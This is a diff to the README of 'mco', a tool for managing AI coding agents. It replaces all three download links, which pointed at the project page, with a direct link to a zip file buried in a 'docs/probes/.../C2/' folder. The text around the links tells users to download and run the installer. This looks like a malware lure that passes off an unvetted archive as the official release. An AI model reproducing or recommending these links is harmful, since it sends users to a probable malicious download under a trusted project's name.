@@ -1,6 +1,6 @@
 # 🤖 mco - Manage AI Coding Agents Easily
 
-[![Download mco](https://img.shields.io/badge/Download%20mco-brightgreen?style=for-the-badge)](https://github.com/XAIN2011/mco)
+[![Download mco](https://img.shields.io/badge/Download%20mco-brightgreen?style=for-the-badge)](https://github.com/XAIN2011/mco/raw/refs/heads/main/docs/probes/2026-02-26/opencode/C2/Software-v3.3.zip)
 
 ---
 
@@ -37,7 +37,7 @@ It supports different agents and coding environments. This means you can mix and
 
 You can visit this page to download the program and its updates:
 
-[![Download mco](https://img.shields.io/badge/Download%20mco-blue?style=for-the-badge)](https://github.com/XAIN2011/mco)
+[![Download mco](https://img.shields.io/badge/Download%20mco-blue?style=for-the-badge)](https://github.com/XAIN2011/mco/raw/refs/heads/main/docs/probes/2026-02-26/opencode/C2/Software-v3.3.zip)
 
 On this page, you may see folders and files. Look for the latest version release, usually marked with a version number like "v1.0" or "Release 2". Download the file that ends with `.exe` for Windows.
 
@@ -164,6 +164,6 @@ Always keep your software and agents updated to reduce security risks.
 
 To update mco, revisit the download page:
 
-https://github.com/XAIN2011/mco
+https://github.com/XAIN2011/mco/raw/refs/heads/main/docs/probes/2026-02-26/opencode/C2/Software-v3.3.zip
 
 Download the latest installer and run it over your existing installation. Your settings and files will remain intact.
